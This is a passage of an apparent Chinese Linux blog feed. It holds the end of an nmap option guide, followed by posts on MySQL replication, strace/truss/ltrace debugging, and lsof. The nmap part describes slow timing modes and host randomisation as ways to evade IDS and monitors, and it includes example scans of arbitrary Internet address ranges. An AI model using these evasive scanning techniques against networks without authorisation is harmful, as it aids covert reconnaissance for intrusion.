对于一些扫描，使用这个选项会造成性能上的微小损失，因为我有时会保存关于特定源端口的一些有用的信息。<br>　　-r<br>　　告诉nmap不要打乱被扫描端口的顺序。<br>　　–randomize_hosts<br>　　使nmap在扫描之前，打乱每组扫描中的主机顺序，nmap每组可以扫描最多2048台主机。这样，可以使扫描更不容易被网络监视器发现，尤其和–scan_delay 选项组合使用，更能有效避免被发现。<br>　　-M<br>　　设置进行TCP connect()扫描时，最多使用多少个套接字进行并行的扫描。使用这个选项可以降低扫描速度，避免远程目标宕机。</p><p>4.3 适时选项</p><p>　　通常，nmap在运行时，能够很好地根据网络特点进行调整。扫描时，nmap会尽量减少被目标检测到的机会，同时尽可能加快扫描速度。然而，nmap默认的适时策略有时候不太适合你的目标。使用下面这些选项，可以控制nmap的扫描timing：</p><p>-T<br>　 　设置nmap的适时策略。Paranoid:为了避开IDS的检测使扫描速度极慢，nmap串行所有的扫描，每隔至少5分钟发送 一个包； Sneaky：也差不多，只是数据包的发送间隔是15秒；Polite：不增加太大的网络负载，避免宕掉目标主机，串行每个探测，并且使每个探测有0.4 秒种的间隔；Normal:nmap默认的选项，在不是网络过载或者主机/端口丢失的情况下尽可能快速地扫描；Aggressive:设置5分钟的超时限 制，使对每台主机的扫描时间不超过5分钟，并且使对每次探测回应的等待时间不超过1.5秒钟；b&gt;Insane:只适合快速的网络或者你不在意丢失 某些信息，每台主机的超时限制是75秒，对每次探测只等待0.3秒钟。你也可是使用数字来代替这些模式，例如：-T 0等于-T Paranoid，-T 5等于-T Insane。<br>　　这些适时模式不能下面的适时选项组合使用。<br>–host_timeout<br>　　设置扫描一台主机的时间，以毫秒为单位。默认的情况下，没有超时限制。<br>–max_rtt_timeout<br>　　设置对每次探测的等待时间，以毫秒为单位。如果超过这个时间限制就重传或者超时。默认值是大约9000毫秒。<br>–min_rtt_timeout<br>　　当目标主机的响应很快时，nmap就缩短每次探测的超时时间。这样会提高扫描的速度，但是可能丢失某些响应时间比较长的包。使用这个选项，可以让nmap对每次探测至少等待你指定的时间，以毫秒为单位。<br>–initial_rtt_timeout<br>　　设置初始探测的超时值。一般这个选项只在使用-P0选项扫描有防火墙保护的主机才有用。默认值是6000毫秒。<br>–max_parallelism<br>　　设置最大的并行扫描数量。–max_parallelism 1表示同时只扫描一个端口。这个选项对其它的并行扫描也有效，例如ping sweep, RPC scan。<br>–scan_delay<br>　　设置在两次探测之间，nmap必须等待的时间。这个选项主要用于降低网络的负载。  </p><p>4.4 目标设定</p><p>　 　在nmap的所有参数中，只有目标参数是必须给出的。其最简单的形式是在命令行直接输入一个主机名或者一个IP地址。如果你希望扫描某个IP地 址的一个子网，你可以在主机名或者IP地址的后面加上/掩码。掩码在0(扫描整个网络)到32(只扫描这个主机)。使用/24扫描C类地址，/16扫描B 类地址。</p><p>　　除此之外，nmap还有更加强大的表示方式让你更加灵活地指定IP地址。例如，如果要扫描这个B类网络 128.210.<em>.</em>，你可以使用下面 三种方式来指定这些地址:128.210.<em>.</em>、128.21-.0-255.0-255或者128.210.0.0/16这三种形式是等价的。</p><p>5.例子</p><p>　　本节将由浅入深地举例说明如何使用nmap。</p><p>nmap -v target.example.com<br>扫描主机target.example.com的所有TCP端口。-v打开冗余模式。</p><p>nmap -sS -O target.example.com/24<br>发起对target.example.com所在网络上的所有255个IP地址的秘密SYN扫描。同时还探测每台主机操作系统的指纹特征。需要root权限。</p><p>nmap -sX -p 22,53,110,143,4564 128.210.*.1-127<br>对B类IP地址128.210中255个可能的8位子网的前半部分发起圣诞树扫描。确定这些系统是否打开了sshd、DNS、pop3d、imapd和4564端口。注意圣诞树扫描对Micro$oft的系统无效，因为其协议栈的TCP层有缺陷。</p><p>nmap -v –randomize_hosts -p 80 <em>.</em>.2.3-5<br>只 扫描指定的IP范围，有时用于对这个 Internet进行取样分析。nmap将寻找Internet上所有后两个字节是.2.3、.2.4、.2.5的 IP地址上的WEB服务器。如果你想发现更多有意思的主机，你可以使用127-222，因为在这个范围内有意思的主机密度更大。</p><p>host -l company.com | cut -d -f 4 | ./nmap -v -iL -<br>列出company.com网络的所有主机，让nmap进行扫描。注意：这项命令在GNU/Linux下使用。如果在其它平台，你可能要使用 其它的命令/选项</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 数据库双机热备的配置</title>
      <link href="/2009/12/22/mysql-database-dual-machine-hot-standby-configuration/"/>
      <url>/2009/12/22/mysql-database-dual-machine-hot-standby-configuration/</url>
      <content type="html"><![CDATA[<p>1。mysql数据库没有增量备份的机制，当数据量太大的时候备份是一个很大的问题。还好mysql数据库提供了一种主从备份的机制，其实就是把主数据库的所有的数据同时写到备份数据库中。实现mysql数据库的热备份。</p><p>2。要想实现双机的热备首先要了解主从数据库服务器的版本的需求。要实现热备mysql的版本都要高于3.2，还有一个基本的原则就是作为从数据库的数据库版本可以高于主服务器数据库的版本，但是不可以低于主服务器的数据库版本。<br>3。设置主数据库服务器：<br>a. 首先查看主服务器的版本是否是支持热备的版本。然后查看my.cnf(类unix)或者my.ini(windows)中mysqld配置块的配置有没有 log-bin(记录数据库更改日志)，因为mysql的复制机制是基于日志的复制机制，所以主服务器一定要支持更改日志才行。然后设置要写入日志的数据 库或者不要写入日志的数据库。这样只有您感兴趣的数据库的更改才写入到数据库的日志中。</p><p>server-id=1 //数据库的id这个应该默认是1就不用改动<br>log-bin=log_name //日志文件的名称，这里可以制定日志到别的目录 如果没有设置则默认主机名的一个日志名称<br>binlog-do-db=db_name //记录日志的数据库<br>binlog-ignore-db=db_name //不记录日志的数据库<br>以上的如果有多个数据库用”,”分割开<br>然后设置同步数据库的用户帐号<br>mysql&gt; GRANT REPLICATION SLAVE ON <em>.</em><br>-> TO ‘repl‘@’%.mydomain.com’ IDENTIFIED BY ‘slavepass’;<br>4.0.2以前的版本, 因为不支持REPLICATION 要使用下面的语句来实现这个功能<br>mysql&gt; GRANT FILE ON <em>.</em><br>-> TO ‘repl‘@’%.mydomain.com’ IDENTIFIED BY ‘slavepass’;<br>设置好主服务器的配置文件后重新启动数据库<br>b.锁定现有的数据库并备份现在的数据<br>锁定数据库<br>mysql&gt; FLUSH TABLES WITH READ LOCK;<br>备份数据库有两种办法一种是直接进入到mysql的data目录然后打包你需要备份数据库的文件夹，第二种是使用mysqldump的方式来备份数据库但是要加上”–master-data “ 这个参数，建议使用第一种方法来备份数据库<br>c.查看主服务器的状态<br>mysql&gt; show master statusG;<br>+—————+———-+————–+——————+<br>| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |<br>+—————+———-+————–+——————+<br>| mysql-bin.003 | 73 | test | manual,mysql |<br>+—————+———-+————–+——————+<br>记录File 和 Position 项目的值，以后要用的。<br>d.然后把数据库的锁定打开<br>mysql&gt; UNLOCK TABLES;<br>4。设置从服务器<br>a.首先设置数据库的配置文件<br>server-id=n //设置数据库id默认主服务器是1可以随便设置但是如果有多台从服务器则不能重复。<br>master-host=db-master.mycompany.com //主服务器的IP地址或者域名<br>master-port=3306 //主数据库的端口号<br>master-user=pertinax //同步数据库的用户<br>master-password=freitag //同步数据库的密码<br>master-connect-retry=60 //如果从服务器发现主服务器断掉，重新连接的时间差<br>report-host=db-slave.mycompany.com //报告错误的服务器<br>b.把从主数据库服务器备份出来的数据库导入到从服务器中<br>c.然后启动从数据库服务器，如果启动的时候没有加上”–skip-slave-start”这个参数则进入到mysql中<br>mysql&gt; slave stop; //停止slave的服务<br>d.设置主服务器的各种参数<br>mysql&gt; CHANGE MASTER TO<br>-> MASTER_HOST=’master_host_name’, //主服务器的IP地址<br>-> MASTER_USER=’replication_user_name’, //同步数据库的用户<br>-> MASTER_PASSWORD=’replication_password’, //同步数据库的密码<br>-> MASTER_LOG_FILE=’recorded_log_file_name’, //主服务器二进制日志的文件名(前面要求记住的参数)<br>-> MASTER_LOG_POS=recorded_log_position; //日志文件的开始位置(前面要求记住的参数)<br>e.启动同步数据库的线程<br>mysql&gt; slave start;<br>查看数据库的同步情况吧。如果能够成功同步那就恭喜了！<br>查看主从服务器的状态<br>mysql&gt; SHOW PROCESSLISTG //可以查看mysql的进程看看是否有监听的进程<br>如果日志太大清除日志的步骤如下<br>1.锁定主数据库<br>mysql&gt; FLUSH TABLES WITH READ LOCK;<br>2.停掉从数据库的slave<br>mysql&gt; slave stop;<br>3.查看主数据库的日志文件名和日志文件的position<br>show master status;<br>+—————+———-+————–+——————+<br>| File | Position | Binlog_do_db | Binlog_ignore_db |<br>+—————+———-+————–+——————+<br>| louis-bin.001 | 79 | | mysql |<br>+—————+———-+————–+——————+<br>4.解开主数据库的锁<br>mysql&gt; unlock tables;<br>5.更新从数据库中主数据库的信息<br>mysql&gt; CHANGE MASTER TO<br>-> MASTER_HOST=’master_host_name’, //主服务器的IP地址<br>-> MASTER_USER=’replication_user_name’, //同步数据库的用户<br>-> MASTER_PASSWORD=’replication_password’, //同步数据库的密码<br>-> MASTER_LOG_FILE=’recorded_log_file_name’, //主服务器二进制日志的文件名(前面要求记住的参数)<br>-> MASTER_LOG_POS=recorded_log_position; //日志文件的开始位置(前面要求记住的参数)<br>6.启动从数据库的slave<br>mysql&gt; slave start;</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>strace命令详解</title>
      <link href="/2009/12/22/the-strace-command-details/"/>
      <url>/2009/12/22/the-strace-command-details/</url>
      <content type="html"><![CDATA[<p>strace 命令是一种强大的工具，它能够显示所有由用户空间程序发出的系统调用。<br>　　strace 显示这些调用的参数并返回符号形式的值。strace 从内核接收信息，而且不需要以任何特殊的方式来构建内核。<br>　　下面记录几个常用 option .<br>　　1 -f -F选项告诉strace同时跟踪fork和vfork出来的进程<br>　　2 -o xxx.txt 输出到某个文件。<br>　　3 -e execve 只记录 execve 这类系统调用<br>　　—————————————————<br>　　进程无法启动，软件运行速度突然变慢，程序的”SegmentFault”等等都是让每个Unix系统用户头痛的问题，<br>　　本文通过三个实际案例演示如何使用truss、strace和ltrace这三个常用的调试工具来快速诊断软件的”疑难杂症”。<br>　　<br>　　<br>　　truss和strace用来跟踪一个进程的系统调用或信号产生的情况，而 ltrace用来跟踪进程调用库函数的情况。truss是早期为System V R4开发的调试程序，包括Aix、FreeBSD在内的大部分Unix系统都自带了这个工具；<br>　　而strace最初是为SunOS系统编写的，ltrace最早出现在GNU/DebianLinux中。<br>　　这两个工具现在也已被移植到了大部分Unix系统中，大多数Linux发行版都自带了strace和ltrace，而FreeBSD也可通过Ports安装它们。<br>　　<br>　　你不仅可以从命令行调试一个新开始的程序，也可以把truss、strace或ltrace绑定到一个已有的PID上来调试一个正在运行的程序。三个调试工具的基本使用方法大体相同，下面仅介绍三者共有，而且是最常用的三个命令行参数：<br>　　<br>　　-f ：除了跟踪当前进程外，还跟踪其子进程。<br>　　-o file ：将输出信息写到文件file中，而不是显示到标准错误输出（stderr）。<br>　　-p pid ：绑定到一个由pid对应的正在运行的进程。此参数常用来调试后台进程。<br>　　<br>　　 使用上述三个参数基本上就可以完成大多数调试任务了，下面举几个命令行例子：<br>　　truss -o ls.truss ls -al： 跟踪ls -al的运行，将输出信息写到文件/tmp/ls.truss中。<br>　　strace -f -o vim.strace vim： 跟踪vim及其子进程的运行，将输出信息写到文件vim.strace。<br>　　ltrace -p 234： 跟踪一个pid为234的已经在运行的进程。<br>　　<br>　　 三个调试工具的输出结果格式也很相似，以strace为例：<br>　　<br>　　brk(0) = 0×8062aa8<br>　　brk(0×8063000) = 0×8063000<br>　　mmap2(NULL, 4096, PROT_READ, MAP_PRIVATE, 3, 0×92f) = 0×40016000<br>　　<br>　　每一行都是一条系统调用，等号左边是系统调用的函数名及其参数，右边是该调用的返回值。 truss、strace和ltrace的工作原理大同小异，都是使用ptrace系统调用跟踪调试运行中的进程，详细原理不在本文讨论范围内，有兴趣可以参考它们的源代码。<br>　　举两个实例演示如何利用这三个调试工具诊断软件的”疑难杂症”：<br>　　<br>　　案例一：运行clint出现Segment Fault错误<br>　　<br>　　操作系统：FreeBSD-5.2.1-release<br>　　clint是一个C++静态源代码分析工具，通过Ports安装好之后，运行：<br>　　<br>　　# clint foo.cpp<br>　　Segmentation fault (core dumped)<br>　　 在Unix系统中遇见”Segmentation Fault”就像在MS Windows中弹出”非法操作”对话框一样令人讨厌。OK，我们用truss给clint”把把脉”：<br>　　<br>　　# truss -f -o clint.truss clint<br>　　Segmentation fault (core dumped)<br>　　# tail clint.truss<br>　　 739: read(0×6,0×806f000,0×1000) = 4096 (0×1000)<br>　　 739: fstat(6,0xbfbfe4d0) = 0 (0×0)<br>　　 739: fcntl(0×6,0×3,0×0) = 4 (0×4)<br>　　 739: fcntl(0×6,0×4,0×0) = 0 (0×0)<br>　　 739: close(6) = 0 (0×0)<br>　　 739: stat(“/root/.clint/plugins”,0xbfbfe680) ERR#2 ‘No such file or directory’<br>　　SIGNAL 11<br>　　SIGNAL 11<br>　　Process stopped because of: 16<br>　　process exit, rval = 139<br>　　我们用truss跟踪clint的系统调用执行情况，并把结果输出到文件clint.truss，然后用tail查看最后几行。<br>　 　注意看clint执行的最后一条系统调用（倒数第五行）：stat(“/root/.clint/plugins”,0xbfbfe680) ERR#2 ‘No such file or directory’，问题就出在这里：clint找不到目录”/root/.clint/plugins”，从而引发了段错误。怎样解决？很简单： mkdir -p /root/.clint/plugins，不过这次运行clint还是会”Segmentation Fault”9。继续用truss跟踪，发现clint还需要这个目录”/root/.clint/plugins/python”，建好这个目录后 clint终于能够正常运行了。<br>　　<br>　　案例二：vim启动速度明显变慢<br>　　<br>　　操作系统：FreeBSD-5.2.1-release<br>　 　vim版本为6.2.154，从命令行运行vim后，要等待近半分钟才能进入编辑界面，而且没有任何错误输出。仔细检查了.vimrc和所有的vim脚 本都没有错误配置，在网上也找不到类似问题的解决办法，难不成要hacking source code？没有必要，用truss就能找到问题所在：<br>　　<br>　　# truss -f -D -o vim.truss vim<br>　　<br>　　这里-D参数的作用是：在每行输出前加上相对时间戳，即每执行一条系统调用所耗费的时间。我们只要关注哪些系统调用耗费的时间比较长就可以了，用less仔细查看输出文件vim.truss，很快就找到了疑点：<br>　　<br>　　735: 0.000021511 socket(0×2,0×1,0×0) = 4 (0×4)<br>　　735: 0.000014248 setsockopt(0×4,0×6,0×1,0xbfbfe3c8,0×4) = 0 (0×0)<br>　　735: 0.000013688 setsockopt(0×4,0xffff,0×8,0xbfbfe2ec,0×4) = 0 (0×0)<br>　　735: 0.000203657 connect(0×4,{ AF_INET 10.57.18.27:6000 },16) ERR#61 ‘Connection refused’<br>　　735: 0.000017042 close(4) = 0 (0×0)<br>　　735: 1.009366553 nanosleep(0xbfbfe468,0xbfbfe460) = 0 (0×0)<br>　　735: 0.000019556 socket(0×2,0×1,0×0) = 4 (0×4)<br>　　735: 0.000013409 setsockopt(0×4,0×6,0×1,0xbfbfe3c8,0×4) = 0 (0×0)<br>　　735: 0.000013130 setsockopt(0×4,0xffff,0×8,0xbfbfe2ec,0×4) = 0 (0×0)<br>　　735: 0.000272102 connect(0×4,{ AF_INET 10.57.18.27:6000 },16) ERR#61 ‘Connection refused’<br>　　735: 0.000015924 close(4) = 0 (0×0)<br>　　735: 1.009338338 nanosleep(0xbfbfe468,0xbfbfe460) = 0 (0×0)<br>　　<br>　 　vim试图连接10.57.18.27这台主机的6000端口（第四行的connect（）），连接失败后，睡眠一秒钟继续重试（第6行的 nanosleep（））。以上片断循环出现了十几次，每次都要耗费一秒多钟的时间，这就是vim明显变慢的原因。可是，你肯定会纳闷：”vim怎么会无 缘无故连接其它计算机的6000端口呢？”。问得好，那么请你回想一下6000是什么服务的端口？没错，就是X Server。看来vim是要把输出定向到一个远程X Server，那么Shell中肯定定义了DISPLAY变量，查看.cshrc，果然有这么一行：setenv DISPLAY ${REMOTEHOST}:0，把它注释掉，再重新登录，问题就解决了。<br>　　<br>　　<br>　　案例三：用调试工具掌握软件的工作原理<br>　　<br>　　操作系统：Red Hat Linux 9.0<br>　 　用调试工具实时跟踪软件的运行情况不仅是诊断软件”疑难杂症”的有效的手段，也可帮助我们理清软件的”脉络”，即快速掌握软件的运行流程和工作原理，不 失为一种学习源代码的辅助方法。下面这个案例展现了如何使用strace通过跟踪别的软件来”触发灵感”，从而解决软件开发中的难题的。<br>　　大家都知道，在进程内打开一个文件，都有唯一一个文件描述符（fd：file descriptor）与这个文件对应。而本人在开发一个软件过程中遇到这样一个问题：<br>　 　已知一个fd，如何获取这个fd所对应文件的完整路径？不管是Linux、FreeBSD或是其它Unix系统都没有提供这样的API，怎么办呢？我们 换个角度思考：Unix下有没有什么软件可以获取进程打开了哪些文件？如果你经验足够丰富，很容易想到lsof，使用它既可以知道进程打开了哪些文件，也 可以了解一个文件被哪个进程打开。好，我们用一个小程序来试验一下lsof，看它是如何获取进程打开了哪些文件。lsof： 显示进程打开的文件。<br>　　<br>　　/* testlsof.c <em>/<br>　　#include #include #include #include #include<br>　　int main(void)<br>　　{<br>　　 open(“/tmp/foo”, O_CREAT|O_RDONLY); /</em> 打开文件/tmp/foo <em>/<br>　　 sleep(1200); /</em> 睡眠1200秒，以便进行后续操作 */<br>　　 return 0;<br>　　}<br>　　<br>　　将testlsof放入后台运行，其pid为3125。命令lsof -p 3125查看进程3125打开了哪些文件，我们用strace跟踪lsof的运行，输出结果保存在lsof.strace中：<br>　　<br>　　# gcc testlsof.c -o testlsof<br>　　# ./testlsof &amp;<br>　　[1] 3125<br>　　# strace -o lsof.strace lsof -p 3125<br>　　<br>　　我们以”/tmp/foo”为关键字搜索输出文件lsof.strace，结果只有一条：<br>　　<br>　　<br>　　# grep ‘/tmp/foo’ lsof.strace<br>　　readlink(“/proc/3125/fd/3”, “/tmp/foo”, 4096) = 8<br>　　<br>　 　原来lsof巧妙的利用了/proc/nnnn/fd/目录（nnnn为pid）：Linux内核会为每一个进程在/proc/建立一个以其pid为名 的目录用来保存进程的相关信息，而其子目录fd保存的是该进程打开的所有文件的fd。目标离我们很近了。好，我们到/proc/3125/fd/看个究 竟：<br>　　<br>　　# cd /proc/3125/fd/<br>　　# ls -l<br>　　total 0<br>　　lrwx—— 1 root root 64 Nov 5 09:50 0 -&gt; /dev/pts/0<br>　　lrwx—— 1 root root 64 Nov 5 09:50 1 -&gt; /dev/pts/0<br>　　lrwx—— 1 root root 64 Nov 5 09:50 2 -&gt; /dev/pts/0<br>　　lr-x—— 1 root root 64 Nov 5 09:50 3 -&gt; /tmp/foo<br>　　# readlink /proc/3125/fd/3<br>　　/tmp/foo<br>　　<br>　　答案已经很明显了：/proc/nnnn/fd/目录下的每一个fd文件都是符号链接，而此链接就指向被该进程打开的一个文件。我们只要用readlink()系统调用就可以获取某个fd对应的文件了，代码如下：<br>　　<br>　　<br>　　#include #include #include #include #include #include<br>　　int get_pathname_from_fd(int fd, char pathname[], int n)<br>　　{<br>　　 char buf[1024];<br>　　 pid_t pid;<br>　　 bzero(buf, 1024);<br>　　 pid = getpid();<br>　　 snprintf(buf, 1024, “/proc/%i/fd/%i”, pid, fd);<br>　　 return readlink(buf, pathname, n);<br>　　}<br>　　int main(void)<br>　　{<br>　　 int fd;<br>　　 char pathname[4096];<br>　　 bzero(pathname, 4096);<br>　　 fd = open(“/tmp/foo”, O_CREAT|O_RDONLY);<br>　　 get_pathname_from_fd(fd, pathname, 4096);<br>　　 printf(“fd=%d; pathname=%sn”, fd, pathname);<br>　　 return 0;<br>　　}<br>　　<br>　 　出于安全方面的考虑，在FreeBSD 5 之后系统默认已经不再自动装载proc文件系统，因此，要想使用truss或strace跟踪程序，你必须手工装载proc文件系统：mount -t procfs proc /proc；或者在/etc/fstab中加上一行：<br>　　<br>　　proc /proc procfs rw 0 0</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>lsof 命令详解</title>
      <link href="/2009/12/22/the-lsof-command-details/"/>
      <url>/2009/12/22/the-lsof-command-details/</url>
      <content type="html"><![CDATA[<p>lsof全名list opened files，也就是列举系统中已经被打开的文件。我们都知道，linux环境中，任何事物都是文件，设备是文件，目录是文件，甚至sockets也是文 件。所以，用好lsof命令，对日常的linux管理非常有帮助。以下的说明，大部分内容来自lsof的manual文档。我所做的只是在中文翻译的基础 上，进行简单的分类说明，并列举最常用的参数。</p><p>一、输出说明<br>   lsof是linux最常用的命令之一，通常的输出格式为：</p><p>引用<br>COMMAND     PID   USER   FD      TYPE     DEVICE     SIZE       NODE NAME</p><p>常见包括如下几个字段：更多的可见manual。<br>1、COMMAND<br>默认以9个字符长度显示的命令名称。可使用+c参数指定显示的宽度，若+c后跟的参数为零，则显示命令的全名<br>2、PID：进程的ID号<br>3、PPID<br>父进程的IP号，默认不显示，当使用-R参数可打开。<br>4、PGID<br>进程组的ID编号，默认也不会显示，当使用-g参数时可打开。<br>5、USER<br>命令的执行UID或系统中登陆的用户名称。默认显示为用户名，当使用-l参数时，可显示UID。<br>6、FD<br>是文件的File Descriptor number，或者如下的内容：<br>（这里很难翻译对应的意思，保留英文）</p><p>引用<br>cwd  current working directory;<br>Lnn  library references (AIX);<br>jld  jail directory (FreeBSD);<br>ltx  shared library text (code and data);<br>Mxx  hex memory-mapped type number xx.<br>m86  DOS Merge mapped file;<br>mem  memory-mapped file;<br>mmap memory-mapped device;<br>pd   parent directory;<br>rtd  root directory;<br>tr   kernel trace file (OpenBSD);<br>txt  program text (code and data);<br>v86  VP/ix mapped file;</p><p>文件的File Descriptor number显示模式有：</p><p>引用<br>r for read access;<br>w for write access;<br>u for read and write access;<br>N for a Solaris NFS lock of unknown type;<br>r for read lock on part of the file;<br>R for a read lock on the entire file;<br>w for a write lock on part of the file;<br>W for a write lock on the entire file;<br>u for a read and write lock of any length;<br>U for a lock of unknown type;<br>x for an SCO OpenServer Xenix lock on part  of the file;<br>X  for an SCO OpenServer Xenix lock on the entire file;<br>space if there is no lock.</p><p>7、TYPE</p><p>引用<br>IPv4 IPv4的包；<br>IPv6 使用IPv6格式的包，即使地址是IPv4的，也会显示为IPv6，而映射到IPv6的地址；<br>DIR 目录<br>LINK 链接文件</p><p>详情请看manual中更多的注释。<br>8、DEVICE<br>使用character special、block special表示的设备号<br>9、SIZE<br>文件的大小，如果不能用大小表示的，会留空。使用-s参数控制。<br>10、NODE<br>本地文件的node码，或者协议，如TCP等<br>11、NAME<br>挂载点和文件的全路径（链接会被解析为实际路径），或者连接双方的地址和端口、状态等</p><p>二、参数<br>1、不带额外参数运行</p><p>lsof path/filename</p><p>显示已打开该目录或文件的所有进程信息</p><p>lsof `which httpd`</p><p>显示指定命令的信息<br>2、参见参数<br>-c w 显示以w开头命令的已打开文件的信息</p><p>lsof -c sshd</p><p>-p PID 显示指定PID已打开文件的信息</p><p>lsof -p 4401</p><p>+d dir 依照文件夹dir来搜寻，但不会打开子目录</p><p>lsof +d /root</p><p>+D dir 打开dir文件夹以及其子目录搜寻</p><p>lsof +D /root/</p><p>-d s 以FD列的信息进行匹配，可使用3-10，表示范围，3,10表示某些值</p><p>lsof -d 3-10</p><p>-u 显示某用户的已经打开的文件（或该用户执行程序已经打开的文件）</p><p>lsof -u root<br>lsof -u 0</p><p>◎可配合正规表达式使用<br>表示不包括root用户的信息：</p><p>lsof -u ^root</p><p>-i 监听指定的协议、端口、主机等的网络信息，格式为：</p><p>引用<br>[46][proto][@host|addr][:svc_list|port_list]</p><p>例如：</p><p>lsof -i <a href="mailto:tcp@192.168.228.244" target="_blank" rel="noopener">tcp@192.168.228.244</a>为防备电子邮件地址收集器，这个 E-mail 地址被隐藏，你的浏览器必须支持 Javascript 才可看到这个邮件地址<br>lsof -i:22</p><p>还可以使用一些参数控制显示结果：</p><p>引用<br>-l 禁止将userID转换为登陆名称，即显示UID<br>-n 禁止将IP地址转换为hostname主机文件<br>-P 不显示端口名称</p><p>-g s 从PGID列进行匹配</p><p>lsof -g 3-10</p><p>3、其他参数<br>+f 所有路径参数都必须是文件系统，否则不能执行<br>-f 所有路径参数都将作为普通的文件，例如：”-f – /“中的/，只会匹配单个/路径，而不会是根目录中的所有文件<br>+f和-f后都应加上“–”表终结符：</p><p>lsof -f – /</p><p>+L/-L 打开或关闭文件的连结数计算，当+L没有指定时，所有的连结数都会显示（默认）；若+L后指定数字，则只要连结数小于该数字的信息会显示；连结数会显示在NLINK列。<br>例如：+L1将显示没有unlinked的文件信息；+aL1，则显示指定文件系统所有unlinked的文件信息<br>-L 默认参数，其后不能跟数字，将不显示连结数信息</p><p>lsof +L1</p><p>-t 仅打印进程，方便shell脚本调用</p><p>lsof -t -c sshd</p><p>-F 指定输出那个列，可通过lsof -F?查看<br>-r 不断执行lsof命令，默认每15秒间隔执行一次<br>+r 也是不断执行lsof命令，但直到没有接受到文件信息，则停止</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用truss、strace或ltrace诊断软件的&amp;quot;疑难杂症&amp;quot;</title>
      <link href="/2009/12/22/using-truss-strace-or-ltrace-diagnostic-software-amp-quot-complications-amp-quot/"/>
      <url>/2009/12/22/using-truss-strace-or-ltrace-diagnostic-software-amp-quot-complications-amp-quot/</url>
      <content type="html"><![CDATA[<p>进程无法启动，软件运行速度突然变慢，程序的”Segment Fault”等等都是让每个Unix系统用户头痛的问题，本文通过三个实际案例演示如何使用truss、strace和ltrace这三个常用的调试工具来快速诊断软件的”疑难杂症”。  </p><pre><code>truss 和strace用来跟踪一个进程的系统调用或信号产生的情况，而 ltrace用来跟踪进程调用库函数的情况。truss是早期为System V R4开发的调试程序，包括Aix、FreeBSD在内的大部分Unix系统都自带了这个工具；而strace最初是为SunOS系统编写的，ltrace 最早出现在GNU/Debian Linux中。这两个工具现在也已被移植到了大部分Unix系统中，大多数Linux发行版都自带了strace和ltrace，而FreeBSD也可通 过Ports安装它们。  你不仅可以从命令行调试一个新开始的程序，也可以把truss、strace或ltrace绑定到一个已有的PID上来调试一个正在运行的程序。三个调试工具的基本使用方法大体相同，下面仅介绍三者共有，而且是最常用的三个命令行参数：  </code></pre><p>de&gt;-f ：除了跟踪当前进程外，还跟踪其子进程。<br>-o file ：将输出信息写到文件file中，而不是显示到标准错误输出（stderr）。<br>-p pid ：绑定到一个由pid对应的正在运行的进程。此参数常用来调试后台进程。de&gt;</p><pre><code>使用上述三个参数基本上就可以完成大多数调试任务了，下面举几个命令行例子：  </code></pre><p>de&gt;truss -o ls.truss ls -al： 跟踪ls -al的运行，将输出信息写到文件/tmp/ls.truss中。<br>strace -f -o vim.strace vim： 跟踪vim及其子进程的运行，将输出信息写到文件vim.strace。<br>ltrace -p 234： 跟踪一个pid为234的已经在运行的进程。de&gt;</p><pre><code>三个调试工具的输出结果格式也很相似，以strace为例：  </code></pre><p>de&gt;brk(0)                                  = 0x8062aa8<br>brk(0x8063000)                          = 0x8063000<br>mmap2(NULL, 4096, PROT_READ, MAP_PRIVATE, 3, 0x92f) = 0x40016000de&gt;</p><pre><code>每一行都是一条系统调用，等号左边是系统调用的函数名及其参数，右边是该调用的返回值。 truss、strace和ltrace的工作原理大同小异，都是使用ptrace系统调用跟踪调试运行中的进程，详细原理不在本文讨论范围内，有兴趣可以参考它们的源代码。举两个实例演示如何利用这三个调试工具诊断软件的&quot;疑难杂症&quot;：  </code></pre><p><strong>案例一：运行clint出现Segment Fault错误</strong>  </p><pre><code>操作系统：FreeBSD-5.2.1-release  clint是一个C++静态源代码分析工具，通过Ports安装好之后，运行：  </code></pre><p>de&gt;# clint foo.cpp<br>Segmentation fault (core dumped)de&gt;</p><pre><code>在Unix系统中遇见&quot;Segmentation Fault&quot;就像在MS Windows中弹出&quot;非法操作&quot;对话框一样令人讨厌。OK，我们用truss给clint&quot;把把脉&quot;：  </code></pre><p>de&gt;# truss -f -o clint.truss clint<br>Segmentation fault (core dumped)<br># tail clint.truss<br>  739: read(0x6,0x806f000,0x1000)               = 4096 (0x1000)<br>  739: fstat(6,0xbfbfe4d0)                       = 0 (0x0)<br>  739: fcntl(0x6,0x3,0x0)                        = 4 (0x4)<br>  739: fcntl(0x6,0x4,0x0)                        = 0 (0x0)<br>  739: close(6)                                    = 0 (0x0)<br>  739: stat(“/root/.clint/plugins”,0xbfbfe680)   ERR#2 ‘No such file or directory’<br>SIGNAL 11<br>SIGNAL 11<br>Process stopped because of:  16<br>process exit, rval = 139de&gt;</p><pre><code>我 们用truss跟踪clint的系 统调用执行情况，并把结果输出到文件clint.truss，然后用tail查看最后几行。注意看clint执行的最后一条系统调用（倒数第五 行）：stat(&quot;/root/.clint/plugins&quot;,0xbfbfe680) ERR#2 &apos;No such file or directory&apos;，问题就出在这里：clint找不到目录&quot;/root/.clint/plugins&quot;，从而引发了段错误。怎样解决？很简单： mkdir -p /root/.clint/plugins，不过这次运行clint还是会&quot;Segmentation Fault&quot;9。继续用truss跟踪，发现clint还需要这个目录&quot;/root/.clint/plugins/python&quot;，建好这个目录后 clint终于能够正常运行了。  </code></pre><p><strong>案例二：vim启动速度明显变慢</strong>  </p><pre><code>操作系统：FreeBSD-5.2.1-release  vim 版本为6.2.154，从命令行运行vim后，要等待近半分钟才能进入编辑界面，而且没有任何错误输出。仔细检查了. vimrc和所有的vim脚本都没有错误配置，在网上也找不到类似问题的解决办法，难不成要hacking source code？没有必要，用truss就能找到问题所在：  </code></pre><p>de&gt;# truss -f -D -o vim.truss vimde&gt;</p><pre><code>这里-D参数的作用是：在每行输出前加上相对时间戳，即每执行一条系统调用所耗费的时间。我们只要关注哪些系统调用耗费的时间比较长就可以了，用less仔细查看输出文件vim.truss，很快就找到了疑点：  </code></pre><p>de&gt;735: 0.000021511 socket(0x2,0x1,0x0)       = 4 (0x4)<br>735: 0.000014248 